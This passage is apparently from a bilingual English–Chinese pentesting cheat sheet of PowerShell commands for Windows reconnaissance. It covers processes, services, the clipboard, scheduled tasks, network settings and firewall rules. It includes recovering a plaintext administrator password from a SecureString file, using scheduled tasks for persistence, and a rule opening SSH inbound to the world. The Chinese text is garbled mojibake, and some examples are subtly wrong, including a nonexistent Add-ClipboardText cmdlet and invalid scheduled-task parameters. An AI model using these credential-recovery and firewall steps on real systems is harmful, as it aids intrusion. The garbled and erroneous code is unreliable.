- Retrieve the contents of the clipboard:
```powershell
$clipboardContents = Get-Clipboard
```

- Set the contents of the clipboard:
```powershell
Set-Clipboard -Value "Hello, world!"
```

- Add text to the clipboard without replacing the existing contents:
```powershell
Add-ClipboardText -Text "Additional text"
```

By utilizing PowerShell's clipboard functionality, you can easily manipulate and extract information from the clipboard during a pentesting engagement. This can be particularly useful when conducting reconnaissance or gathering sensitive data. However, it is important to note that accessing someone's clipboard without their knowledge or consent may be illegal and unethical. Always ensure that you have proper authorization and follow ethical guidelines when performing any pentesting activities.
```powershell
Get-Clipboard
```
## è¿›ç¨‹

Processes are running instances of programs on a computer. They can be thought of as the execution of a program in memory. Each process has its own memory space and resources, and they can communicate with each other through various mechanisms.

è¿›ç¨‹æ˜¯è®¡ç®—æœºä¸Šè¿è¡Œçš„ç¨‹åºå®ä¾‹ã€‚å¯ä»¥å°†å…¶è§†ä¸ºå†…å­˜ä¸­ç¨‹åºçš„æ‰§è¡Œã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´å’Œèµ„æºï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥é€šè¿‡å„ç§æœºåˆ¶è¿›è¡Œé€šä¿¡ã€‚

### Viewing Processes

### æŸ¥çœ‹è¿›ç¨‹

To view the processes running on a Windows system, you can use the `Get-Process` cmdlet in PowerShell. This cmdlet retrieves information about the processes running on the local or remote computer.

è¦æŸ¥çœ‹åœ¨Windowsç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Get-Process`å‘½ä»¤ã€‚è¯¥å‘½ä»¤æ£€ç´¢æœ‰å…³æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºä¸Šè¿è¡Œçš„è¿›ç¨‹çš„ä¿¡æ¯ã€‚

```powershell
Get-Process
```

This command will display a list of processes running on the system, including their names, process IDs (PIDs), and memory usage.

æ­¤å‘½ä»¤å°†æ˜¾ç¤ºç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„åç§°ã€è¿›ç¨‹IDï¼ˆPIDï¼‰å’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚

### Killing Processes

### ç»ˆæ­¢è¿›ç¨‹

To terminate a process in PowerShell, you can use the `Stop-Process` cmdlet. This cmdlet allows you to stop one or more processes based on their process IDs or names.

è¦åœ¨PowerShellä¸­ç»ˆæ­¢è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨`Stop-Process`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æ ¹æ®è¿›ç¨‹IDæˆ–åç§°åœæ­¢ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ã€‚

```powershell
Stop-Process -Name "process_name"
```

Replace `"process_name"` with the name of the process you want to terminate.

å°†`"process_name"`æ›¿æ¢ä¸ºè¦ç»ˆæ­¢çš„è¿›ç¨‹çš„åç§°ã€‚

### Starting Processes

### å¯åŠ¨è¿›ç¨‹

You can use the `Start-Process` cmdlet in PowerShell to start a new process. This cmdlet allows you to specify the path to the executable file and any arguments or parameters required by the program.

æ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Start-Process`å‘½ä»¤æ¥å¯åŠ¨æ–°è¿›ç¨‹ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ä»¥åŠç¨‹åºæ‰€éœ€çš„ä»»ä½•å‚æ•°æˆ–å‚æ•°ã€‚

```powershell
Start-Process -FilePath "path_to_executable"
```

Replace `"path_to_executable"` with the path to the executable file you want to start.

å°†`"path_to_executable"`æ›¿æ¢ä¸ºè¦å¯åŠ¨çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚

### Conclusion

### ç»“è®º

Understanding processes and how to view, terminate, and start them is essential for any pentester. PowerShell provides powerful cmdlets like `Get-Process`, `Stop-Process`, and `Start-Process` to manage processes effectively.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## æœåŠ¡

### Introduction

### ä»‹ç»

In this section, we will cover some basic PowerShell commands that can be useful for pentesters when performing reconnaissance and enumeration on Windows systems. PowerShell is a powerful scripting language and automation framework that is built into Windows. It provides a command-line interface for interacting with the Windows operating system and can be used to perform a wide range of tasks, including system administration, network analysis, and security testing.

åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€äº›åŸºæœ¬çš„PowerShellå‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜åœ¨å¯¹Windowsç³»ç»Ÿè¿›è¡Œä¾¦å¯Ÿå’Œæšä¸¾æ—¶éå¸¸æœ‰ç”¨ã€‚PowerShellæ˜¯ä¸€ç§å¼ºå¤§çš„è„šæœ¬è¯­è¨€å’Œè‡ªåŠ¨åŒ–æ¡†æ¶ï¼Œå®ƒå†…ç½®äºWindowsä¸­ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨äºä¸Windowsæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œå¹¶å¯ç”¨äºæ‰§è¡Œå„ç§ä»»åŠ¡ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç®¡ç†ã€ç½‘ç»œåˆ†æå’Œå®‰å…¨æµ‹è¯•ã€‚

### Basic PowerShell Commands

### åŸºæœ¬çš„PowerShellå‘½ä»¤

#### Get-Service

#### Get-Service

The `Get-Service` command is used to retrieve information about services running on a Windows system. It can be used to list all services, filter services based on specific criteria, and retrieve detailed information about a particular service.

`Get-Service`å‘½ä»¤ç”¨äºæ£€ç´¢è¿è¡Œåœ¨Windowsç³»ç»Ÿä¸Šçš„æœåŠ¡çš„ä¿¡æ¯ã€‚å®ƒå¯ä»¥ç”¨äºåˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼Œæ ¹æ®ç‰¹å®šæ¡ä»¶è¿‡æ»¤æœåŠ¡ï¼Œå¹¶æ£€ç´¢æœ‰å…³ç‰¹å®šæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚

To list all services, simply run the following command:

è¦åˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼Œåªéœ€è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service
```

This will display a list of all services running on the system, including their names, display names, and status.

è¿™å°†æ˜¾ç¤ºç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰æœåŠ¡çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„åç§°ã€æ˜¾ç¤ºåç§°å’ŒçŠ¶æ€ã€‚

To filter services based on specific criteria, you can use the `-Name` parameter followed by a wildcard pattern. For example, to list all services starting with "SQL", you can run the following command:

è¦æ ¹æ®ç‰¹å®šæ¡ä»¶è¿‡æ»¤æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨`-Name`å‚æ•°åè·Ÿé€šé…ç¬¦æ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œè¦åˆ—å‡ºæ‰€æœ‰ä»¥"SQL"å¼€å¤´çš„æœåŠ¡ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service -Name SQL*
```

This will display a list of services whose names start with "SQL".

è¿™å°†æ˜¾ç¤ºä»¥"SQL"å¼€å¤´çš„æœåŠ¡çš„åˆ—è¡¨ã€‚

To retrieve detailed information about a particular service, you can use the `-Name` parameter followed by the name of the service. For example, to retrieve information about the "Spooler" service, you can run the following command:

è¦æ£€ç´¢æœ‰å…³ç‰¹å®šæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨`-Name`å‚æ•°åè·ŸæœåŠ¡çš„åç§°ã€‚ä¾‹å¦‚ï¼Œè¦æ£€ç´¢æœ‰å…³"Spooler"æœåŠ¡çš„ä¿¡æ¯ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service -Name Spooler
```

This will display detailed information about the "Spooler" service, including its status, startup type, and process ID.

è¿™å°†æ˜¾ç¤ºæœ‰å…³"Spooler"æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶çŠ¶æ€ã€å¯åŠ¨ç±»å‹å’Œè¿›ç¨‹IDã€‚

#### Start-Service

#### Start-Service

The `Start-Service` command is used to start a stopped service on a Windows system. It can be used to start a single service or multiple services at once.

`Start-Service`å‘½ä»¤ç”¨äºå¯åŠ¨Windowsç³»ç»Ÿä¸Šçš„å·²åœæ­¢çš„æœåŠ¡ã€‚å®ƒå¯ä»¥ç”¨äºå¯åŠ¨å•ä¸ªæœåŠ¡æˆ–åŒæ—¶å¯åŠ¨å¤šä¸ªæœåŠ¡ã€‚

To start a single service, you can use the `-Name` parameter followed by the name of the service. For example, to start the "Spooler" service, you can run the following command:

è¦å¯åŠ¨å•ä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨`-Name`å‚æ•°åè·ŸæœåŠ¡çš„åç§°ã€‚ä¾‹å¦‚ï¼Œè¦å¯åŠ¨"Spooler"æœåŠ¡ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Start-Service -Name Spooler
```

This will start the "Spooler" service if it is currently stopped.

å¦‚æœ"Spooler"æœåŠ¡å½“å‰å·²åœæ­¢ï¼Œè¿™å°†å¯åŠ¨å®ƒã€‚

To start multiple services at once, you can provide a comma-separated list of service names to the `-Name` parameter. For example, to start both the "Spooler" and "BITS" services, you can run the following command:

è¦åŒæ—¶å¯åŠ¨å¤šä¸ªæœåŠ¡ï¼Œå¯ä»¥å°†æœåŠ¡åç§°ä»¥é€—å·åˆ†éš”çš„å½¢å¼æä¾›ç»™`-Name`å‚æ•°ã€‚ä¾‹å¦‚ï¼Œè¦åŒæ—¶å¯åŠ¨"Spooler"å’Œ"BITS"æœåŠ¡ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Start-Service -Name Spooler,BITS
```

This will start both the "Spooler" and "BITS" services if they are currently stopped.

å¦‚æœ"Spooler"å’Œ"BITS"æœåŠ¡å½“å‰å·²åœæ­¢ï¼Œè¿™å°†åŒæ—¶å¯åŠ¨å®ƒä»¬ã€‚

#### Stop-Service

#### Stop-Service

The `Stop-Service` command is used to stop a running service on a Windows system. It can be used to stop a single service or multiple services at once.

`Stop-Service`å‘½ä»¤ç”¨äºåœæ­¢Windowsç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚å®ƒå¯ä»¥ç”¨äºåœæ­¢å•ä¸ªæœåŠ¡æˆ–åŒæ—¶åœæ­¢å¤šä¸ªæœåŠ¡ã€‚

To stop a single service, you can use the `-Name` parameter followed by the name of the service. For example, to stop the "Spooler" service, you can run the following command:

è¦åœæ­¢å•ä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨`-Name`å‚æ•°åè·ŸæœåŠ¡çš„åç§°ã€‚ä¾‹å¦‚ï¼Œè¦åœæ­¢"Spooler"æœåŠ¡ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Stop-Service -Name Spooler
```

This will stop the "Spooler" service if it is currently running.

å¦‚æœ"Spooler"æœåŠ¡å½“å‰æ­£åœ¨è¿è¡Œï¼Œè¿™å°†åœæ­¢å®ƒã€‚

To stop multiple services at once, you can provide a comma-separated list of service names to the `-Name` parameter. For example, to stop both the "Spooler" and "BITS" services, you can run the following command:

è¦åŒæ—¶åœæ­¢å¤šä¸ªæœåŠ¡ï¼Œå¯ä»¥å°†æœåŠ¡åç§°ä»¥é€—å·åˆ†éš”çš„å½¢å¼æä¾›ç»™`-Name`å‚æ•°ã€‚ä¾‹å¦‚ï¼Œè¦åŒæ—¶åœæ­¢"Spooler"å’Œ"BITS"æœåŠ¡ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Stop-Service -Name Spooler,BITS
```

This will stop both the "Spooler" and "BITS" services if they are currently running.

å¦‚æœ"Spooler"å’Œ"BITS"æœåŠ¡å½“å‰æ­£åœ¨è¿è¡Œï¼Œè¿™å°†åŒæ—¶åœæ­¢å®ƒä»¬ã€‚

### Conclusion

### ç»“è®º

PowerShell provides a powerful set of commands for interacting with services on a Windows system. The `Get-Service`, `Start-Service`, and `Stop-Service` commands can be used to retrieve information about services, start stopped services, and stop running services, respectively. These commands can be useful for pentesters during the reconnaissance and enumeration phases of a penetration test.

PowerShellæä¾›äº†ä¸€ç»„å¼ºå¤§çš„å‘½ä»¤ï¼Œç”¨äºä¸Windowsç³»ç»Ÿä¸Šçš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚`Get-Service`ã€`Start-Service`å’Œ`Stop-Service`å‘½ä»¤åˆ†åˆ«ç”¨äºæ£€ç´¢æœ‰å…³æœåŠ¡çš„ä¿¡æ¯ã€å¯åŠ¨å·²åœæ­¢çš„æœåŠ¡å’Œåœæ­¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚è¿™äº›å‘½ä»¤å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜åœ¨æ¸—é€æµ‹è¯•çš„ä¾¦å¯Ÿå’Œæšä¸¾é˜¶æ®µéå¸¸æœ‰ç”¨ã€‚
```
Get-Service
```
## ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç 

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¤„ç†å¯†ç ã€‚åœ¨Windowsç¯å¢ƒä¸­ï¼Œå¯†ç é€šå¸¸ä»¥å®‰å…¨å­—ç¬¦ä¸²çš„å½¢å¼å­˜å‚¨ï¼Œè¿™æ˜¯ä¸€ç§åŠ å¯†çš„æ–¹å¼ï¼Œå¯ä»¥ä¿æŠ¤å¯†ç çš„æœºå¯†æ€§ã€‚ç„¶è€Œï¼Œå¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»çš„å¯†ç ï¼Œä»¥ä¾¿åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚

PowerShellæä¾›äº†ä¸€ç§ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç çš„æ–¹æ³•ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹è„šæœ¬ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨PowerShellä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–å¯†ç ï¼š

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
Write-Output $plainTextPassword
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨`ConvertTo-SecureString`å‘½ä»¤å°†æ˜æ–‡å¯†ç è½¬æ¢ä¸ºå®‰å…¨å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨`[Runtime.InteropServices.Marshal]::SecureStringToBSTR`æ–¹æ³•å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºBSTRï¼ˆåŸºäºCOMçš„å­—ç¬¦ä¸²ï¼‰è¡¨ç¤ºã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨`[Runtime.InteropServices.Marshal]::PtrToStringAuto`æ–¹æ³•å°†BSTRè½¬æ¢ä¸ºå¯è¯»çš„å¯†ç ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°æ§åˆ¶å°ã€‚

é€šè¿‡è¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œæ‚¨å°†èƒ½å¤Ÿä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–å¯†ç å¹¶å°†å…¶æ˜¾ç¤ºå‡ºæ¥ã€‚è¿™å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒå…è®¸æˆ‘ä»¬åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨æ˜æ–‡å¯†ç ã€‚

è¯·æ³¨æ„ï¼Œä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–å¯†ç å¯èƒ½ä¼šå¯¼è‡´å¯†ç æ³„éœ²çš„é£é™©ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨æ­¤æŠ€æœ¯æ—¶ï¼Œè¯·ç¡®ä¿é‡‡å–é€‚å½“çš„å®‰å…¨æªæ–½ï¼Œå¹¶ä»…åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## è®¡åˆ’ä»»åŠ¡

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to leverage scheduled tasks can be beneficial for persistence, privilege escalation, and lateral movement.

è®¡åˆ’ä»»åŠ¡æ˜¯Windowsä¸­çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ï¼Œå®ƒå…è®¸æ‚¨åœ¨ç‰¹å®šæ—¶é—´æˆ–é—´éš”å†…è‡ªåŠ¨æ‰§è¡Œè„šæœ¬æˆ–ç¨‹åºã€‚ä½œä¸ºä¸€åæ¸—é€æµ‹è¯•äººå‘˜ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨è®¡åˆ’ä»»åŠ¡å¯ä»¥å¯¹æŒä¹…æ€§ã€æƒé™æå‡å’Œæ¨ªå‘ç§»åŠ¨äº§ç”Ÿç§¯æå½±å“ã€‚

### Viewing Scheduled Tasks

### æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡

To view the existing scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves a list of all scheduled tasks along with their properties.

è¦æŸ¥çœ‹Windowsç³»ç»Ÿä¸Šç°æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Get-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤æ£€ç´¢æ‰€æœ‰è®¡åˆ’ä»»åŠ¡åŠå…¶å±æ€§çš„åˆ—è¡¨ã€‚

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

### åˆ›å»ºè®¡åˆ’ä»»åŠ¡

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script or program to be executed, the trigger that defines when the task should run, and other settings such as the user account under which the task should run.

è¦åˆ›å»ºä¸€ä¸ªæ–°çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`New-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æŒ‡å®šè¦æ‰§è¡Œçš„è„šæœ¬æˆ–ç¨‹åºã€å®šä¹‰ä»»åŠ¡ä½•æ—¶è¿è¡Œçš„è§¦å‘å™¨ä»¥åŠå…¶ä»–è®¾ç½®ï¼Œå¦‚ä»»åŠ¡åº”åœ¨å“ªä¸ªç”¨æˆ·å¸æˆ·ä¸‹è¿è¡Œã€‚

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -User "DOMAIN\username" -Password "password"
```

### Modifying Scheduled Tasks

### ä¿®æ”¹è®¡åˆ’ä»»åŠ¡

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script or program to be executed, the trigger, and the user account.

è¦ä¿®æ”¹ç°æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Set-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æ›´æ”¹ä»»åŠ¡çš„å„ç§å±æ€§ï¼Œå¦‚è¦æ‰§è¡Œçš„è„šæœ¬æˆ–ç¨‹åºã€è§¦å‘å™¨å’Œç”¨æˆ·å¸æˆ·ã€‚

```powershell
Set-ScheduledTask -TaskPath "\Folder" -TaskName "TaskName" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 4am) -User "DOMAIN\username" -Password "password"
```

### Deleting Scheduled Tasks

### åˆ é™¤è®¡åˆ’ä»»åŠ¡

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

è¦åˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Unregister-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä»ç³»ç»Ÿä¸­åˆ é™¤æŒ‡å®šçš„ä»»åŠ¡ã€‚

```powershell
Unregister-ScheduledTask -TaskPath "\Folder" -TaskName "TaskName"
```

### Conclusion

### ç»“è®º

Scheduled tasks are a useful feature in Windows that can be leveraged by pentesters for various purposes. By understanding how to view, create, modify, and delete scheduled tasks using PowerShell, you can enhance your capabilities as a pentester and effectively navigate Windows systems.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ç½‘ç»œ

### æ¥å£

#### PowerShellå‘½ä»¤

```powershell
Get-NetAdapter
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç½‘ç»œé€‚é…å™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
----                      --------------------                    ------- ------       ----------             ---------
Ethernet                  Intel(R) Ethernet Connection (2) I219-V      12 Up           00-11-22-33-44-55       1 Gbps
Wi-Fi                     Intel(R) Dual Band Wireless-AC 8265          13 Up           66-77-88-99-AA-BB       300 Mbps
```

#### è§£é‡Š

- `Name`ï¼šé€‚é…å™¨çš„åç§°ã€‚
- `InterfaceDescription`ï¼šé€‚é…å™¨çš„æè¿°ã€‚
- `ifIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
- `Status`ï¼šé€‚é…å™¨çš„çŠ¶æ€ã€‚
- `MacAddress`ï¼šé€‚é…å™¨çš„ç‰©ç†åœ°å€ã€‚
- `LinkSpeed`ï¼šé€‚é…å™¨çš„é“¾æ¥é€Ÿåº¦ã€‚

#### PowerShellå‘½ä»¤

```powershell
Get-NetIPAddress
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰IPåœ°å€çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
IPAddress         : 192.168.1.100
InterfaceIndex    : 12
InterfaceAlias    : Ethernet
AddressFamily     : IPv4
Type              : Unicast
PrefixLength      : 24
PrefixOrigin      : Manual
SuffixOrigin      : Manual
AddressState      : Preferred
ValidLifetime     : Infinite ([TimeSpan]::MaxValue)
PreferredLifetime : Infinite ([TimeSpan]::MaxValue)
SkipAsSource      : False
PolicyStore       : ActiveStore
```

#### è§£é‡Š

- `IPAddress`ï¼šIPåœ°å€ã€‚
- `InterfaceIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
- `InterfaceAlias`ï¼šé€‚é…å™¨çš„åˆ«åã€‚
- `AddressFamily`ï¼šåœ°å€ç±»å‹ã€‚
- `Type`ï¼šåœ°å€ç±»å‹ã€‚
- `PrefixLength`ï¼šå‰ç¼€é•¿åº¦ã€‚
- `PrefixOrigin`ï¼šå‰ç¼€æ¥æºã€‚
- `SuffixOrigin`ï¼šåç¼€æ¥æºã€‚
- `AddressState`ï¼šåœ°å€çŠ¶æ€ã€‚
- `ValidLifetime`ï¼šæœ‰æ•ˆæœŸé™ã€‚
- `PreferredLifetime`ï¼šé¦–é€‰æœŸé™ã€‚
- `SkipAsSource`ï¼šæ˜¯å¦è·³è¿‡ä½œä¸ºæºã€‚
- `PolicyStore`ï¼šç­–ç•¥å­˜å‚¨ã€‚

#### PowerShellå‘½ä»¤

```powershell
Get-NetRoute
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰è·¯ç”±è¡¨é¡¹çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
ifIndex DestinationPrefix    NextHop     RouteMetric ifMetric PolicyStore
------- -----------------    -------     ----------- -------- -----------
12      0.0.0.0/0            192.168.1.1 0           25       ActiveStore
```

#### è§£é‡Š

- `ifIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
- `DestinationPrefix`ï¼šç›®æ ‡å‰ç¼€ã€‚
- `NextHop`ï¼šä¸‹ä¸€è·³ã€‚
- `RouteMetric`ï¼šè·¯ç”±åº¦é‡ã€‚
- `ifMetric`ï¼šé€‚é…å™¨åº¦é‡ã€‚
- `PolicyStore`ï¼šç­–ç•¥å­˜å‚¨ã€‚
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### é˜²ç«å¢™

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or as software running on a computer.

é˜²ç«å¢™æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œæ ¹æ®é¢„å…ˆç¡®å®šçš„å®‰å…¨è§„åˆ™ç›‘æ§å’Œæ§åˆ¶è¿›å‡ºç½‘ç»œçš„æµé‡ã€‚å®ƒä½œä¸ºä¸€ä¸ªå±éšœå­˜åœ¨äºå¯ä¿¡ä»»çš„å†…éƒ¨ç½‘ç»œå’Œä¸å¯ä¿¡ä»»çš„å¤–éƒ¨ç½‘ç»œï¼ˆå¦‚äº’è”ç½‘ï¼‰ä¹‹é—´ã€‚é˜²ç«å¢™å¯ä»¥ä½œä¸ºç¡¬ä»¶è®¾å¤‡å®ç°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºè¿è¡Œåœ¨è®¡ç®—æœºä¸Šçš„è½¯ä»¶å®ç°ã€‚

Firewalls use various techniques to filter network traffic, such as packet filtering, stateful inspection, and application-level gateways. They can block or allow traffic based on factors such as source and destination IP addresses, port numbers, and protocols.

é˜²ç«å¢™ä½¿ç”¨å„ç§æŠ€æœ¯æ¥è¿‡æ»¤ç½‘ç»œæµé‡ï¼Œå¦‚æ•°æ®åŒ…è¿‡æ»¤ã€çŠ¶æ€æ£€æŸ¥å’Œåº”ç”¨å±‚ç½‘å…³ã€‚å®ƒä»¬å¯ä»¥æ ¹æ®æºå’Œç›®æ ‡IPåœ°å€ã€ç«¯å£å·å’Œåè®®ç­‰å› ç´ æ¥é˜»æ­¢æˆ–å…è®¸æµé‡é€šè¿‡ã€‚

Firewalls are an essential component of network security and are commonly used to protect against unauthorized access, malware, and other cyber threats. They can be configured to provide different levels of security based on the specific needs of an organization.

é˜²ç«å¢™æ˜¯ç½‘ç»œå®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œé€šå¸¸ç”¨äºé˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ã€æ¶æ„è½¯ä»¶å’Œå…¶ä»–ç½‘ç»œå¨èƒã€‚å¯ä»¥æ ¹æ®ç»„ç»‡çš„å…·ä½“éœ€æ±‚é…ç½®ä¸åŒçº§åˆ«çš„å®‰å…¨æ€§ã€‚
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
